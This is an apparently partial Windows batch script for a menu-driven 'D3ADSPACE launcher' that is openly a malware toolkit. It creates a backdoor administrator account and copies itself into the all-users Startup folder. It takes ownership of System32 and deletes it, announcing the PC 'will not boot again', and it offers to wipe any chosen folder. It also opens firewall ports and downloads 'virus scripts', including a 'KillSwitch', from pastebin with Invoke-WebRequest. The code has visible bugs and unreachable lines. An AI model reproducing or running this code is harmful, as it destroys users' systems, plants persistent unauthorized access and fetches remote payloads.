(set CHAR[45GH45]=\) & (set CHAR[56H45G]=/)
set/p Decrypt=Enter a string to decrypt:
cls
set Decrypt2=%Decrypt%
set "DecryptOut="
:decrypt2
set char=%Decrypt2:~0,6%
set Decrypt2=%Decrypt2:~6%
set DecryptOut=%DecryptOut%!CHAR[%char%]!
if not "%Decrypt2%"=="" goto decrypt2
echo Input string: %Decrypt%
echo.
echo Output string: %DecryptOut%
set string=%DecryptOut%
set temp_str=%string%
set str_len=0
:lengthloop
if defined temp_str (
set temp_str=%temp_str:~1%
set /A str_len += 1
goto lengthloop )
echo.
echo Output string is %str_len% characters long!
cd %Root%\EncryptionLogs
if "%savefile%"=="on" echo.%DecryptOut%>>%~d0%~p0decrypted.txt
echo.
pause
cls
goto ED-CE

:PP-Opener
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
set/p Port=What port do you want to open:
set RULE_NAME="Open Port %PORT%"
netsh advfirewall firewall show rule name=%RULE_NAME% >nul
if not ERRORLEVEL 1 (
    echo Error Rule Already Exists
) else (
    echo Rule %RULE_NAME% does not exist. Creating...
    netsh advfirewall firewall add rule name=%RULE_NAME% dir=in action=allow protocol=TCP localport=%PORT%
    goto PP-CHK
)
echo Completed Port Opener
pause> nul
goto BIF

:CWI-MENU-ADMINERROR
cls
echo.
echo Please run this application with admin rights.
echo.
set/p que=Do you want to run this without admin?[Y/N]
if %que%==y goto CWI-LAST
if %que%==n goto BIF

:CWI-LAST
cls
echo.
echo WARNING!
echo.
echo CONTINUING MAY END UP BY APPLICATION CRASHING OR ERRORS!
echo.
pause
goto CWI-MENU

:WA
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
ECHO 1 - Display All Connected Ip's
ECHO 2 - Ping an IP
ECHO 3 - Display YOUR internet information
ECHO 4 - Return
echo.
set/p opt=Please select an option:
if %OPT%==1 goto DACI
if %OPT%==2 goto PAIP
if %OPT%==3 goto DYII
if %OPT%==4 goto BIF

:DACI
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
arp -a
echo.
pause> nul
goto WA

:PAIP
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
set/p pingip=Please enter IP you want to ping:
echo.
ping %pingip% -t -n 10
echo.
pause> nul
goto WA

:DYII
cls
echo.
echo The Network analyser analyses IP's connected to your pc!
echo.
echo Getting IP Information...
for /f "tokens=1-2 delims=:" %%a in ('ipconfig^|find "IPv4"') do set ip=%%b
set ip=%ip:~1%>NUL
echo Analysing Network Activity...
echo.
cd .
for /f "tokens=1-2 delims=:" %%b in ('ipconfig^|find "Subnet Mask"') do set ipsubnet=%%c
set ipsubnet=%ipsubnet:~1%
cd .
@For /f "tokens=3" %%* in (
    'route.exe print ^|findstr "\<0.0.0.0\>"'
) Do @Set "ipdefault=%%*"
cd .
set "DNS="
for /f "tokens=2 delims=:" %%f in ('nslookup localhost 2^>nul ^| find "Address:"') do set DNS=%%f
cd .
for /f "tokens=2 delims=:" %%l in ('nslookup localhost 2^>nul ^| find "Name:"') do set DNSName=%%l
echo Done!
if %DNSName%==localhost set DNSName=UNKNOWN_ERROR
if %DNS%==2001 set DNS=UNABLE_TO_COLLECT_DATA
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
ECHO Your IP: %ip%
ECHO Your Subnet Mask: %ipsubnet%
ECHO Your DNS Name: %DNSName%
ECHO Your DNS Resolution(s): %DNS%
echo.
pause> nul
goto WA

:CWI-MENU
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
ECHO 1 - Corrupt Windows Installation
ECHO 2 - Corrupt Custom Folder
ECHO 3 - Delete Custom File
ECHO 4 - Return
echo.
set/p opt=Please select an option:
if %OPT%==1 goto CWI
if %OPT%==2 goto CCF
if %OPT%==3 goto DCF
if %OPT%==4 goto BIF

:Backdoor
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
echo Creating User Account...
net user D3ADSPACE 999933-3201 /add
net localgroup administrators D3ADSPACE /add
copy "%~n0%~x0" "C:\Documents and Settings\All Users\Start Menu\Programs\Startup">NUL
echo Copied %~n0%~x0 to C:\Documents and Settings\All Users\Start Menu\Programs\Startup
echo Backdoor File will Improve later...
pause> nul
goto BIF

:DCF
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
set/p Que=Please enter folder location:
if not exist %Que% Goto DCF-ERROR
echo Taking Ownership of %Que%...
takeown /a /f "%Que%"
echo Granting ICALS Ownership...
icacls "%Que%" /grant Administrators:F /T
set/p Que=Are you sure you want to delete %Que%[Y/N]
if %Que%==y DEL /Q /S %Que%
if %Que%==n echo Cancelled by %Username%...
pause> nul
goto BIF

:DCF-ERROR
echo %Que% Does NOT exist!
paus> nul
goto BIF

:CWI
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
echo Taking Ownership of System32...
takeown /a /f "C:\Windows\System32\*"
echo Granting ICALS Ownership...
icacls "C:\Windows\System32\*" /grant Administrators:F /T
set/p Que=Are you sure you want to delete system32?[Y/N]
if %Que%==y DEL /Q /S C:\Windows\System32\*
if %Que%==n echo Cancelled by %Username%...
if %Que%==y echo Don't Worry about all the "Access Denied" these are files in use, this pc will not boot again!
pause> nul
goto BIF

:CCF
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
set/p CCD=Please type in folder to corrupt:
if not exist %CCD% goto CCF-ERROR
echo.
echo Taking Ownership off %CDD%...
takeown /a /f "%CCD%\*"
echo Granting ICALS Ownership...
icacls "%CCD%\*" /grant Administrators:F /T
set/p Que=Are you sure you want to delete this folder?[Y/N]
if %Que%==y DEL /Q /S %CCD%\*
if %Que%==n echo Cancelled by %Username% && goto CCF-BUFFER
if errorlevel 1 echo ERROR While deleting some files!
if errorlevel 0 echo All Files have been deleted
pause> nul
goto BIF

:CCF-BUFFER
pause> nul
goto BIF

:CCF-ERROR
echo %CCD% Doesnt Exist!
pause> nul
goto BIF

:Download_Man
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
ECHO 1 - Download Virus Scripts
ECHO 2 - Download Updates
ECHO 3 - Return
echo.
set/p opt=Please select an option:
if %OPT%==1 GOTO DVS
if %OPT%==2 GOTO DU
if %OPT%==3 GOTO START

:DVS
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
ECHO 1 - H3LTH INSUR3NCE
ECHO 2 - Html Fake Virus
ECHO 3 - Kill Switch
ECHO 4 - Other Options
ECHO 5 - Encryption 
ECHO 6 - Return
echo.
set/p opt=Please select an option:
if %OPT%==1 GOTO H3LTH.INSUR
if %OPT%==2 GOTO HTML
if %OPT%==3 GOTO KILL_SWITCH
if %OPT%==4 GOTO OTHER_OPT
if %OPT%==5 GOTO ENCRYPTION
if %OPT%==6 GOTO Download_Man

:H3LTH.INSUR
cls
echo.
echo Program Name = "H3LTH INSURAN3NCE"
echo Type = "KillSwitch"
echo Date Made = "17/10/2021"
echo Status = "%H3LTHSTAT%"
echo.
ECHO 1 - Download
ECHO 2 - Return
echo.
set/p opt=Please select an option:
if %OPT%==1 GOTO H3LTH.DOWNLOAD
if %OPT%==2 GOTO DVS

:H3LTH.DOWNLOAD
cd %Root%\Downloaded
cls
echo.
echo Downloading File...
powershell -Command "Invoke-WebRequest https://pastebin.com/raw/yx8kkTK9 -Outfile H3LTH.INSUR3NCE.bat"
if exist H3LTH.INSUR3NCE.bat echo File Dowloaded Succesfully!
if not exist H3LTH.INSUR3NCE.bat echo Error whilst downloading!
echo Application will need a restart to take effect
set/p Que=Restart application[Y/N]
if %Que%==y goto BOOTCHECK 
if %Que%==n goto H3LTH.INSUR

:DU
set uplink=
cd %Root%\Temp
cls
echo.
echo Establishing Uplink Connection...
powershell -Command "Invoke-WebRequest https://pastebin.com/raw/nGbQeWR2 -Outfile VersionUplink.cc"
echo Uplink Succesfully Established!
Set count=1
For /f "Usebackq tokens=" %%T in ("C:\Users\%username%\Appdata\Roaming\D3ADSPACE\Temp\VersionUplink.cc") do (
    if !count! EQU 1 (set uplink=%%T)
    set /a count+=1
)
Echo Due to Software Errors this feature is not available!
pause> nul
goto Download_Man
if %update%==YES (
goto UPDATE_AVAIL
)
if %update%==NO (
echo nope
pause
GOTO UPDATE_NOPE
)

:UPDATE_AVAIL
cls
echo.
echo Is Available!
pause> nul

:UPDATE_NOPE
cls
echo.
echo You are running the latest version %Version%.
pause> nul
exit

:HTML
cls
echo.
echo Program Name = "index.html"
echo Type = "HTML"
echo Date Made = "11/3/2021"
echo Status = "%HTMLSTAT%"
echo.
ECHO 1 - Download
ECHO 2 - Return
echo.
set/p opt=Please select an option:
if %OPT%==1 GOTO HTLM.DOWNLOAD
if %OPT%==2 GOTO DVS

:HTLM.DOWNLOAD
cd %Root%\Downloaded
CLS
echo.
echo Downloading File...
powershell -Command "Invoke-WebRequest https://pastebin.com/raw/a0C15xZE -Outfile index.html"
if exist index.html echo File Dowloaded Succesfully!
if not exist index.html echo Error whilst downloading!
echo Application will need a restart to take effect
set/p Que=Restart application[Y/N]
if %Que%==y goto BOOTCHECK 
if %Que%==n goto HTML

:APP_SAFEMODE
set/a Safemode=1
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
ECHO 1 - Exit Safemode
ECHO 2 - Repair Application
ECHO 3 - Uninstall Components
ECHO 4 - Restart Application
echo.
set/p opt=Please select an option:
if %OPT%==1 exit
if %OPT%==2 goto FAE
if %OPT%==3 goto UNINS
if %OPT%==4 goto RootStart



